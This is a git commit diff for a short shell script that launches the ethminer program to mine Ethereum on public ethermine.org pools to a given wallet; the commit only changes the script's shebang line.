03e043ed48fe5e8cedb64cc6347511db9c331992
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-14 09:53:56 +0100

    Update ph.sh

--- ph.sh
+++ ph.sh
@@ -1,3 +1,3 @@
-#!/bin/bash
+#!/bin/sh
 chmod +x ethminer
 ./ethminer --farm-recheck 500 -U -S us1.ethermine.org:4444 -FS eu1.ethermine.org:4444 -O 0xc604d67a91081f9d4d186b3e761993bbaf627e53.alpha%1 --cuda-grid-size 1024 --cuda-streams 32 --cuda-block-size 128
